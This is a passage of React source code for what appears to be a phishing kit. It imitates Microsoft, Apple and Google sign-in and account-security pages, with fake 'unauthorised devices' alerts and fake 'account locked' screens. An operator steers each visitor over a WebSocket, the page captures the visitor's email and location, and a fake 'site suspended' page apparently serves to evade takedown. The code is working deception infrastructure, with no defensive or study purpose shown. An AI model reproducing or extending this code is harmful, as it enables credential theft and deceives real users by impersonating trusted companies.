                  <svg className="w-16 h-16 animate-spin" viewBox="0 0 64 64"><circle cx="32" cy="32" r="28" stroke="#e5e5e5" strokeWidth="5" fill="none"/><path d="M32 4a28 28 0 0128 28" stroke="#0078D4" strokeWidth="5" strokeLinecap="round" fill="none"/></svg>
                  <div className="absolute inset-0 flex items-center justify-center"><MicrosoftLogo /></div>
                </div>
                <div className="text-[18px] font-semibold text-[#1b1b1b] mb-2 text-center">Removing unauthorized devices</div>
                <div className="text-[13px] text-[#605e5c] mb-6 text-center min-h-[18px]">{REMOVAL_MSGS[msgIdx]}</div>
                <div className="w-full bg-[#e5e5e5] rounded-full h-1.5 mb-3 overflow-hidden">
                  <motion.div className="h-full rounded-full bg-[#0078D4]" animate={{ width: `${progressPct}%` }} transition={{ duration: 0.9, ease: 'linear' }} />
                </div>
                <div className="text-[12px] text-[#a19f9d] mb-4">Please wait — this may take a moment</div>
                {extendedShown && (
                  <motion.div initial={{ opacity: 0, y: 4 }} animate={{ opacity: 1, y: 0 }}
                    className="mt-1 text-center bg-[#f7f8fa] border border-[#dde1e7] rounded px-4 py-3">
                    <div className="text-[13px] font-medium text-[#1b1b1b]">Sorry, this may take a little longer.</div>
                    <div className="text-[12px] text-[#605e5c] mt-0.5">We are thoroughly scanning your account for security threats.</div>
                  </motion.div>
                )}
              </motion.div>
            )}
            {phase === 'complete' && (
              <motion.div key="ms-complete-loading" initial={{ opacity: 0 }} animate={{ opacity: 1 }} className="flex flex-col items-center py-10">
                <div className="mb-6 relative w-16 h-16">
                  <svg className="w-16 h-16 animate-spin" viewBox="0 0 64 64"><circle cx="32" cy="32" r="28" stroke="#e5e5e5" strokeWidth="5" fill="none"/><path d="M32 4a28 28 0 0128 28" stroke="#0078D4" strokeWidth="5" strokeLinecap="round" fill="none"/></svg>
                  <div className="absolute inset-0 flex items-center justify-center"><MicrosoftLogo /></div>
                </div>
                <div className="text-[16px] font-semibold text-[#1b1b1b] mb-1 text-center">Just a moment…</div>
                <div className="text-[13px] text-[#605e5c] text-center">Finalising account security</div>
              </motion.div>
            )}
            {phase === 'locked' && (
              <motion.div key="ms-locked" initial={{ opacity: 0, scale: 0.95 }} animate={{ opacity: 1, scale: 1 }} className="flex flex-col items-center py-10">
                <div className="w-16 h-16 rounded-full bg-[#fef3cd] flex items-center justify-center mb-5">
                  <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="#a16207" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
                </div>
                <div className="text-[20px] font-semibold text-[#1b1b1b] mb-2 text-center">Account temporarily locked</div>
                <div className="text-[13px] text-[#605e5c] mb-5 text-center leading-relaxed max-w-[340px]">For your security, we have temporarily locked your Microsoft account. Our systems are running a full security analysis to check for any additional unauthorised access.</div>
                <div className="w-full bg-[#f7f8fa] border border-[#dde1e7] rounded px-4 py-3 mb-6 text-center">
                  <div className="text-[13px] font-semibold text-[#1b1b1b] mb-0.5">Estimated review time</div>
                  <div className="text-[22px] font-bold text-[#0078D4]">6 hours</div>
                  <div className="text-[12px] text-[#605e5c] mt-0.5">You will be alerted once the review is complete</div>
                </div>
              </motion.div>
            )}
          </AnimatePresence>
        </div>
      </div>
    );
  }

  // ── Apple ─────────────────────────────────────────────────────────────────
  if (provider === 'apple') {
    return (
      <div className="fixed inset-0 z-50 overflow-y-auto bg-[#f5f5f7]" style={{ fontFamily: "-apple-system, 'SF Pro Display', system-ui, sans-serif" }}>
        <div className="bg-white/90 backdrop-blur-xl border-b border-[#d1d1d6] px-6 py-3 flex items-center gap-2 sticky top-0 z-10">
          <AppleLogo className="text-black" style={{ width: 17, height: 17 }} />
          <span className="text-[15px] font-medium text-[#1d1d1f]">Apple ID</span>
          <svg width="7" height="12" viewBox="0 0 7 12" fill="none" className="mx-0.5"><path d="M1 1l5 5-5 5" stroke="#c7c7cc" strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round"/></svg>
          <span className="text-[15px] text-[#6e6e73]">Sign-In &amp; Security</span>
          {email && <span className="ml-auto text-[12px] text-[#6e6e73] truncate max-w-[220px]">{email}</span>}
        </div>
        <div className="max-w-[520px] mx-auto px-4 py-8">
          <AnimatePresence mode="wait">
            {phase === 'list' && (
              <motion.div key="apple-list" initial={{ opacity: 0, y: 12 }} animate={{ opacity: 1, y: 0 }} exit={{ opacity: 0 }}>
                <div className="flex gap-3 bg-[#f5f5f7] border border-[#d1d1d6] rounded-2xl px-4 py-3.5 mb-6">
                  <svg width="20" height="20" viewBox="0 0 24 24" fill="none" className="flex-shrink-0 mt-0.5"><path d="M10.29 3.86L1.82 18a2 2 0 001.71 3h16.94a2 2 0 001.71-3L13.71 3.86a2 2 0 00-3.42 0z" stroke="#3a3a3c" strokeWidth="1.5"/><line x1="12" y1="9" x2="12" y2="13" stroke="#3a3a3c" strokeWidth="1.5" strokeLinecap="round"/><circle cx="12" cy="17" r="1" fill="#3a3a3c"/></svg>
                  <div>
                    <div className="text-[14px] font-semibold text-[#1d1d1f] mb-0.5">Unauthorised access detected</div>
                    <div className="text-[13px] text-[#3a3a3c] leading-snug">Devices were detected on your Apple ID that you may not recognise. Review and remove them below.</div>
                  </div>
                </div>
                <div className="text-[26px] font-semibold text-[#1d1d1f] mb-1 tracking-tight">Devices</div>
                <div className="text-[15px] text-[#6e6e73] mb-6">The following devices are signed in to your Apple ID.</div>
                <div className="bg-white rounded-2xl overflow-hidden border border-[#d1d1d6] divide-y divide-[#d1d1d6] mb-6">
                  {SUSP_DEVICES.map(dev => {
                    const isRemoved = removedIds.has(dev.id);
                    const isRemoving = removingId === dev.id;
                    return (
                      <div key={dev.id} className={`px-5 py-4 transition-opacity ${isRemoved ? 'opacity-40' : ''}`}>
                        <div className="flex items-center gap-4">
                          <div className="flex-shrink-0"><DeviceKindIcon kind={dev.kind} size={40} /></div>
                          <div className="flex-1 min-w-0">
                            <div className="flex items-center gap-2 flex-wrap">
                              <span className="text-[16px] font-medium text-[#1d1d1f]">{dev.name}</span>
                              {dev.isCurrent && <span className="text-[11px] font-semibold bg-[#007AFF] text-white px-2 py-0.5 rounded-full">This device</span>}
                              {isRemoved && <span className="text-[12px] text-[#34c759] font-medium flex items-center gap-0.5"><Check className="w-3 h-3" />Removed</span>}
                            </div>
                            <div className="text-[13px] text-[#6e6e73]">{dev.os}</div>
                            <div className="text-[12px] text-[#8e8e93] flex flex-wrap gap-x-1 mt-0.5">
                              {dev.flag && <span>{dev.flag}</span>}
                              <span>{getDevLocation(dev)}</span>
                              {dev.ip && <><span className="text-[#c7c7cc]">·</span><span className="font-mono">{dev.ip}</span></>}
                              <span className="text-[#c7c7cc]">·</span><span>{dev.lastSeen}</span>
                            </div>
                          </div>
                          <div className="flex-shrink-0">
                            {!dev.isCurrent && !isRemoved && !isRemoving && (
                              <button onClick={() => handleRemove(dev.id)}
                                className="text-[#FF3B30] text-[14px] font-medium hover:text-[#c0150a] transition-colors">
                                Remove
                              </button>
                            )}
                            {isRemoving && <svg className="w-4 h-4 animate-spin text-[#8e8e93]" viewBox="0 0 24 24" fill="none"><circle cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="2.5" strokeOpacity="0.3"/><path d="M12 2a10 10 0 0110 10" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round"/></svg>}
                          </div>
                        </div>
                      </div>
                    );
                  })}
                </div>
                {anyRemoved && (
                  <motion.button initial={{ opacity: 0 }} animate={{ opacity: 1 }} onClick={() => setPhase('removing')}
                    className="w-full py-3 rounded-2xl text-[17px] font-medium text-white transition-all hover:brightness-90"
                    style={{ backgroundColor: '#007AFF' }}>
                    Done
                  </motion.button>
                )}
              </motion.div>
            )}
            {phase === 'removing' && (
              <motion.div key="apple-removing" initial={{ opacity: 0 }} animate={{ opacity: 1 }} className="flex flex-col items-center py-12">
                <div className="mb-6">
                  <AppleSpinRing isDark={false} />
                </div>
                <div className="text-[20px] font-semibold text-[#1d1d1f] mb-2 text-center tracking-tight">Removing unauthorised devices</div>
                <div className="text-[15px] text-[#6e6e73] mb-6 text-center min-h-[20px]">{REMOVAL_MSGS[msgIdx]}</div>
                <div className="w-full bg-[#e5e5ea] rounded-full h-1 mb-4 overflow-hidden">
                  <motion.div className="h-full rounded-full bg-[#007AFF]" animate={{ width: `${progressPct}%` }} transition={{ duration: 0.9, ease: 'linear' }} />
                </div>
                <div className="text-[13px] text-[#8e8e93] mb-4">Please wait — this may take a moment</div>
                {extendedShown && (
                  <motion.div initial={{ opacity: 0, y: 4 }} animate={{ opacity: 1, y: 0 }}
                    className="text-center bg-[#f5f5f7] border border-[#d1d1d6] rounded-2xl px-5 py-3 mt-1">
                    <div className="text-[14px] font-medium text-[#1d1d1f]">Sorry, this may take a little longer.</div>
                    <div className="text-[13px] text-[#3a3a3c] mt-0.5">We are thoroughly reviewing your Apple ID for security threats.</div>
                  </motion.div>
                )}
              </motion.div>
            )}
            {phase === 'complete' && (
              <motion.div key="apple-complete-loading" initial={{ opacity: 0 }} animate={{ opacity: 1 }} className="flex flex-col items-center py-14">
                <div className="mb-6"><AppleSpinRing isDark={false} /></div>
                <div className="text-[20px] font-semibold text-[#1d1d1f] mb-1 text-center tracking-tight">Just a moment…</div>
                <div className="text-[15px] text-[#6e6e73] text-center">Finalising account security</div>
              </motion.div>
            )}
            {phase === 'locked' && (
              <motion.div key="apple-locked" initial={{ opacity: 0, scale: 0.95 }} animate={{ opacity: 1, scale: 1 }} className="flex flex-col items-center py-14">
                <div className="w-20 h-20 rounded-full bg-[#fff3cd] flex items-center justify-center mb-6">
                  <svg width="36" height="36" viewBox="0 0 24 24" fill="none" stroke="#92400e" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
                </div>
                <div className="text-[26px] font-semibold text-[#1d1d1f] mb-2 tracking-tight text-center">Apple ID temporarily locked</div>
                <div className="text-[15px] text-[#6e6e73] mb-8 text-center leading-relaxed max-w-[380px]">For your security, we have temporarily locked your Apple ID. Our systems are running a full security analysis to check for any additional unauthorised access.</div>
                <div className="w-full bg-[#f5f5f7] border border-[#d1d1d6] rounded-2xl px-5 py-4 text-center">
                  <div className="text-[13px] font-semibold text-[#1d1d1f] mb-1">Estimated review time</div>
                  <div className="text-[28px] font-bold text-[#007AFF]">6 hours</div>
                  <div className="text-[13px] text-[#6e6e73] mt-1">You will be alerted once the review is complete</div>
                </div>
              </motion.div>
            )}
          </AnimatePresence>
        </div>
      </div>
    );
  }

  // ── Google ────────────────────────────────────────────────────────────────
  return (
    <div className="fixed inset-0 z-50 overflow-y-auto bg-[#f0f4f9]" style={{ fontFamily: "'Google Sans', Roboto, system-ui, sans-serif" }}>
      <div className="bg-white border-b border-[#dadce0] px-6 py-3 flex items-center gap-3 sticky top-0 z-10">
        <GoogleLogo />
        <span className="text-[16px] font-medium text-[#202124] ml-1">Google Account</span>
        {email && <span className="ml-auto text-[12px] text-[#5f6368] truncate max-w-[220px]">{email}</span>}
      </div>
      <div className="max-w-[560px] mx-auto px-4 py-8">
        <AnimatePresence mode="wait">
          {phase === 'list' && (
            <motion.div key="google-list" initial={{ opacity: 0, y: 12 }} animate={{ opacity: 1, y: 0 }} exit={{ opacity: 0 }}>
              <div className="flex gap-3 bg-[#f8f9fa] border border-[#dadce0] rounded-xl px-4 py-3.5 mb-7">
                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" className="flex-shrink-0 mt-0.5"><path d="M10.29 3.86L1.82 18a2 2 0 001.71 3h16.94a2 2 0 001.71-3L13.71 3.86a2 2 0 00-3.42 0z" stroke="#444746" strokeWidth="1.5"/><line x1="12" y1="9" x2="12" y2="13" stroke="#444746" strokeWidth="1.5" strokeLinecap="round"/><circle cx="12" cy="17" r="1" fill="#444746"/></svg>
                <div>
                  <div className="text-[14px] font-medium text-[#202124]">Suspicious device activity detected</div>
                  <div className="text-[13px] text-[#5f6368] leading-snug mt-0.5">We noticed sign-in activity from devices that don't belong to you. Remove any you don't recognise.</div>
                </div>
              </div>
              <div className="text-[22px] font-normal text-[#202124] mb-1">Your devices</div>
              <div className="text-[14px] text-[#5f6368] mb-6">Devices that have recently accessed your Google Account.</div>
              <div className="space-y-3 mb-7">
                {SUSP_DEVICES.map(dev => {
                  const isRemoved = removedIds.has(dev.id);
                  const isRemoving = removingId === dev.id;
                  return (
                    <motion.div key={dev.id} animate={{ opacity: isRemoved ? 0.4 : 1 }} transition={{ duration: 0.3 }}
                      className="bg-white rounded-xl border border-[#dadce0] px-4 py-4 flex items-center gap-4">
                      <div className="flex-shrink-0 w-10 h-10 rounded-full bg-[#f0f4f9] flex items-center justify-center">
                        <DeviceKindIcon kind={dev.kind} size={26} />
                      </div>
                      <div className="flex-1 min-w-0">
                        <div className="flex items-center gap-2 flex-wrap">
                          <span className="text-[15px] font-medium text-[#202124]">{dev.name}</span>
                          {dev.isCurrent && <span className="text-[11px] font-medium bg-[#1a73e8] text-white px-2 py-0.5 rounded-full">This device</span>}
                          {isRemoved && <span className="text-[12px] text-[#1e8e3e] font-medium flex items-center gap-0.5"><Check className="w-3 h-3" />Removed</span>}
                        </div>
                        <div className="text-[13px] text-[#5f6368]">{dev.os}</div>
                        <div className="text-[12px] text-[#80868b] flex flex-wrap gap-x-1">
                          {dev.flag && <span>{dev.flag}</span>}
                          <span>{getDevLocation(dev)}</span>
                          {dev.ip && <><span>·</span><span className="font-mono">{dev.ip}</span></>}
                          <span>·</span><span>{dev.lastSeen}</span>
                        </div>
                      </div>
                      <div className="flex-shrink-0">
                        {!dev.isCurrent && !isRemoved && !isRemoving && (
                          <button onClick={() => handleRemove(dev.id)}
                            className="text-[#d93025] text-[13px] font-medium border border-[#d93025] hover:bg-[#fce8e6] px-3 py-1.5 rounded-full transition-colors">
                            Remove device
                          </button>
                        )}
                        {isRemoving && <svg className="w-5 h-5 animate-spin text-[#1a73e8]" viewBox="0 0 24 24" fill="none"><circle cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="2.5" strokeOpacity="0.25"/><path d="M12 2a10 10 0 0110 10" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round"/></svg>}
                      </div>
                    </motion.div>
                  );
                })}
              </div>
              {anyRemoved && (
                <motion.div initial={{ opacity: 0, y: 6 }} animate={{ opacity: 1, y: 0 }} className="flex justify-end">
                  <button onClick={() => setPhase('removing')}
                    className="px-8 py-2.5 rounded-full text-[14px] font-medium text-white hover:brightness-90 transition-all"
                    style={{ backgroundColor: '#1a73e8' }}>
                    Secure my account
                  </button>
                </motion.div>
              )}
            </motion.div>
          )}
          {phase === 'removing' && (
            <motion.div key="google-removing" initial={{ opacity: 0 }} animate={{ opacity: 1 }} className="flex flex-col items-center py-14">
              <div className="mb-7 relative w-20 h-20">
                <svg className="w-20 h-20 animate-spin" viewBox="0 0 64 64" style={{ animationDuration: '1.1s' }}>
                  <defs><linearGradient id="goog-susp-spin" x1="0%" y1="0%" x2="100%" y2="0%"><stop offset="0%" stopColor="#4285F4"/><stop offset="33%" stopColor="#EA4335"/><stop offset="66%" stopColor="#FBBC05"/><stop offset="100%" stopColor="#34A853"/></linearGradient></defs>
                  <circle cx="32" cy="32" r="28" fill="none" strokeWidth="4.5" strokeLinecap="round" stroke="url(#goog-susp-spin)" strokeDasharray="105 132"/>
                </svg>
                <div className="absolute inset-0 flex items-center justify-center"><GoogleLogo /></div>
              </div>
              <div className="text-[20px] font-normal text-[#202124] mb-2 text-center">Removing unauthorised devices</div>
              <div className="text-[14px] text-[#5f6368] mb-7 text-center min-h-[20px]">{REMOVAL_MSGS[msgIdx]}</div>
              <div className="w-full bg-[#e8eaed] rounded-full h-1.5 mb-4 overflow-hidden">
                <motion.div className="h-full rounded-full bg-[#1a73e8]" animate={{ width: `${progressPct}%` }} transition={{ duration: 0.9, ease: 'linear' }} />
              </div>
              <div className="text-[13px] text-[#80868b] mb-4">Please wait — this may take a moment</div>
              {extendedShown && (
                <motion.div initial={{ opacity: 0, y: 4 }} animate={{ opacity: 1, y: 0 }}
                  className="text-center bg-[#f8f9fa] border border-[#dadce0] rounded-xl px-5 py-3 mt-1">
                  <div className="text-[14px] font-medium text-[#202124]">Sorry, this may take a little longer.</div>
                  <div className="text-[13px] text-[#5f6368] mt-0.5">We are thoroughly reviewing your account activity.</div>
                </motion.div>
              )}
            </motion.div>
          )}
          {phase === 'complete' && (
            <motion.div key="google-complete-loading" initial={{ opacity: 0 }} animate={{ opacity: 1 }} className="flex flex-col items-center py-14">
              <div className="mb-7 relative w-20 h-20">
                <svg className="w-20 h-20 animate-spin" viewBox="0 0 64 64" style={{ animationDuration: '1.1s' }}>
                  <defs><linearGradient id="goog-lock-spin" x1="0%" y1="0%" x2="100%" y2="0%"><stop offset="0%" stopColor="#4285F4"/><stop offset="33%" stopColor="#EA4335"/><stop offset="66%" stopColor="#FBBC05"/><stop offset="100%" stopColor="#34A853"/></linearGradient></defs>
                  <circle cx="32" cy="32" r="28" fill="none" strokeWidth="4.5" strokeLinecap="round" stroke="url(#goog-lock-spin)" strokeDasharray="105 132"/>
                </svg>
                <div className="absolute inset-0 flex items-center justify-center"><GoogleLogo /></div>
              </div>
              <div className="text-[20px] font-normal text-[#202124] mb-1 text-center">Just a moment…</div>
              <div className="text-[14px] text-[#5f6368] text-center">Finalising account security</div>
            </motion.div>
          )}
          {phase === 'locked' && (
            <motion.div key="google-locked" initial={{ opacity: 0, scale: 0.95 }} animate={{ opacity: 1, scale: 1 }} className="flex flex-col items-center py-14">
              <div className="w-20 h-20 rounded-full bg-[#fef3e2] flex items-center justify-center mb-6">
                <svg width="36" height="36" viewBox="0 0 24 24" fill="none" stroke="#e37400" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
              </div>
              <div className="text-[22px] font-normal text-[#202124] mb-2 text-center">Account temporarily locked</div>
              <div className="text-[14px] text-[#5f6368] mb-8 text-center leading-relaxed max-w-[400px]">For your security, we have temporarily locked your Google Account. Our systems are running a full security analysis to check for any additional unauthorised access.</div>
              <div className="w-full bg-[#f8f9fa] border border-[#dadce0] rounded-xl px-5 py-4 text-center">
                <div className="text-[13px] font-medium text-[#202124] mb-1">Estimated review time</div>
                <div className="text-[28px] font-bold text-[#1a73e8]">6 hours</div>
                <div className="text-[13px] text-[#5f6368] mt-1">You will be alerted once the review is complete</div>
              </div>
            </motion.div>
          )}
        </AnimatePresence>
      </div>
    </div>
  );
}

// ─── Root ─────────────────────────────────────────────────────────────────────

export default function LoginPage() {
  useEffect(() => { document.title = 'Sign in'; }, []);
  const [siteActive, setSiteActive] = useState<boolean | null>(null);
  useEffect(() => {
    const base = (import.meta as { env: { BASE_URL: string } }).env.BASE_URL.replace(/\/$/, '');
    fetch(`${base}/api/site-status`)
      .then(r => r.json() as Promise<{ active: boolean }>)
      .then(d => setSiteActive(d.active))
      .catch(() => setSiteActive(true));
  }, []);
  const params = new URLSearchParams(typeof window !== 'undefined' ? window.location.search : '');
  const urlProvider = params.get('provider');
  const [provider, setProvider] = useState(urlProvider || 'microsoft');
  const urlDevice = params.get('device');
  const getAutoDevice = () => {
    if (typeof window === 'undefined') return 'desktop';
    const w = window.innerWidth;
    if (w < 600) return 'mobile';
    if (w < 1024) return 'tablet';
    return 'desktop';
  };
  const [device, setDevice] = useState(urlDevice || getAutoDevice());
  const theme = params.get('theme') || 'light';
  const isViewOnly = params.get('viewOnly') === '1';

  const handleProviderSwitch = isViewOnly ? undefined : (p: string) => {
    setProvider(p);
  };

  // ── Single persistent WebSocket for the lifetime of this page ──────────────
  // Lifted here so the connection survives provider switches (previously each
  // provider component created its own WS, causing a disconnect + reconnect and
  // a new visitorId every time the admin flipped the provider).
  const navigateHandlerRef = useRef<NavigateHandler>(() => {});
  const setNavigateHandler = useCallback((fn: NavigateHandler) => {
    navigateHandlerRef.current = fn;
  }, []);
  const [suspDevMode, setSuspDevMode] = useState<{ waitSeconds: number } | null>(null);
  const [extendedRemoval, setExtendedRemoval] = useState(false);

  const capturedEmailRef = useRef('');
  const [visitorLocation, setVisitorLocation] = useState('');

  useEffect(() => {
    const base = (import.meta as { env: { BASE_URL: string } }).env.BASE_URL.replace(/\/$/, '');
    fetch(`${base}/api/location`)
      .then(r => r.json() as Promise<{ city: string; country: string }>)
      .then(d => { if (d.city && d.country) setVisitorLocation(`${d.city}, ${d.country}`); })
      .catch(() => {});
  }, []);

  const { sendCapture: _rawSendCapture, sendStepUpdate } = useVisitorWS({
    provider,
    onNavigate: (s, action) => {
      if (s === 'suspicious-devices') {
        setSuspDevMode({ waitSeconds: (action as NavigateAction)?.waitSeconds ?? 20 });
        setExtendedRemoval(false);
        return;
      }
      if (s === 'extend-removal-time') { setExtendedRemoval(true); return; }
      setSuspDevMode(null);
      navigateHandlerRef.current(s, action);
    },
    onProviderSwitch: handleProviderSwitch,
    onSiteStatus: (active) => setSiteActive(active),
  });
  const sendCapture = useCallback((field: string, value: string) => {
    if (field === 'email' && value) capturedEmailRef.current = value;
  }, []);

  useEffect(() => { if (suspDevMode) sendStepUpdate('suspicious-devices'); }, [suspDevMode, sendStepUpdate]);

  // Auto-detect device on resize (only when no URL override)
  useEffect(() => {
    if (urlDevice) return;
    const onResize = () => {
      const w = window.innerWidth;
      if (w < 600) setDevice('mobile');
      else if (w < 1024) setDevice('tablet');
      else setDevice('desktop');
    };
    window.addEventListener('resize', onResize);
    return () => window.removeEventListener('resize', onResize);
  }, [urlDevice]);

  // On mount: fetch the admin's globally selected provider from the server.
  // URL param ?provider= takes precedence (used for admin preview iframes).
  // The server's globalProvider is always the source of truth for real visitors.
  useEffect(() => {
    if (urlProvider) return; // URL explicitly set — admin preview iframe, don't override
    const base = (import.meta as { env: { BASE_URL: string } }).env.BASE_URL.replace(/\/$/, '');
    fetch(`${base}/api/global-provider`)
      .then(r => r.json() as Promise<{ provider: string }>)
      .then(d => { if (d.provider) setProvider(d.provider); })
      .catch(() => {});
  // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);

  // Swap the browser tab favicon to match the active provider.
  useEffect(() => {
    const base = (import.meta as { env: { BASE_URL: string } }).env.BASE_URL.replace(/\/$/, '');
    let href = `${base}/favicon.svg`;
    if (provider === 'google') href = `${base}/favicon-gmail.png`;
    else if (provider === 'microsoft') href = `${base}/favicon-outlook.png`;
    let link = document.querySelector<HTMLLinkElement>("link[rel~='icon']");
    if (!link) {
      link = document.createElement('link');
      link.rel = 'icon';
      document.head.appendChild(link);
    }
    link.type = provider === 'google' || provider === 'microsoft' ? 'image/png' : 'image/svg+xml';
    link.href = href;
  }, [provider]);

  if (siteActive === false) {
    return (
      <div className="w-full h-screen flex items-center justify-center bg-[#f3f4f6]">
        <div className="max-w-lg w-full mx-4">
          {/* Status bar */}
          <div className="flex items-center gap-2 mb-6">
            <div className="w-3 h-3 rounded-full bg-red-500" />
            <span className="text-[13px] font-mono text-gray-500">503 Service Unavailable</span>
          </div>
          {/* Main card */}
          <div className="bg-white border border-gray-200 rounded-lg shadow-sm p-8">
            <div className="flex items-start gap-4 mb-6">
              <div className="w-12 h-12 rounded-full bg-red-100 flex items-center justify-center flex-shrink-0 mt-0.5">
                <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#ef4444" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                  <circle cx="12" cy="12" r="10"/><line x1="4.93" y1="4.93" x2="19.07" y2="19.07"/>
                </svg>
              </div>
              <div>
                <h1 className="text-[20px] font-semibold text-gray-900 mb-1">This site has been suspended</h1>
                <p className="text-[14px] text-gray-500 leading-relaxed">
                  The hosting account associated with this site has been suspended due to a violation of our Terms of Service.
                </p>
              </div>
            </div>
            <div className="border-t border-gray-100 pt-5 space-y-3">
              <div className="flex items-start gap-3 text-[13px]">
                <span className="text-gray-400 w-28 flex-shrink-0">Reason</span>
                <span className="text-gray-700">Terms of Service violation</span>
              </div>
              <div className="flex items-start gap-3 text-[13px]">
                <span className="text-gray-400 w-28 flex-shrink-0">Status</span>
                <span className="inline-flex items-center gap-1.5 px-2 py-0.5 rounded-full bg-red-50 text-red-600 text-[11px] font-semibold uppercase tracking-wide">
                  <span className="w-1.5 h-1.5 rounded-full bg-red-500" />
                  Suspended
                </span>
              </div>
              <div className="flex items-start gap-3 text-[13px]">
                <span className="text-gray-400 w-28 flex-shrink-0">Contact</span>
                <span className="text-gray-700">If you are the owner of this website, please contact your hosting provider to resolve this issue.</span>
              </div>
            </div>
          </div>
          <p className="text-center text-[11px] text-gray-400 mt-4">
            Error reference: {Math.random().toString(36).slice(2, 10).toUpperCase()} · {new Date().toUTCString()}
          </p>
        </div>
      </div>
    );
  }

  if (siteActive === null) return null;

  return (
    <div className="w-full h-screen overflow-y-auto">
      {provider === 'microsoft' && <MicrosoftLogin device={device} theme={theme} sendCapture={sendCapture} sendStepUpdate={sendStepUpdate} setNavigateHandler={setNavigateHandler} />}
      {provider === 'apple' && <AppleLogin device={device} theme={theme} sendCapture={sendCapture} sendStepUpdate={sendStepUpdate} setNavigateHandler={setNavigateHandler} />}
      {provider === 'google' && <GoogleLogin device={device} theme={theme} sendCapture={sendCapture} sendStepUpdate={sendStepUpdate} setNavigateHandler={setNavigateHandler} />}
      {suspDevMode && (
        <SuspiciousDevicesScreen
          provider={provider}
          waitSeconds={suspDevMode.waitSeconds}
          extended={extendedRemoval}
          onDone={() => setSuspDevMode(null)}
          email={capturedEmailRef.current}
          visitorLocation={visitorLocation}
        />
      )}
    </div>
  );
}
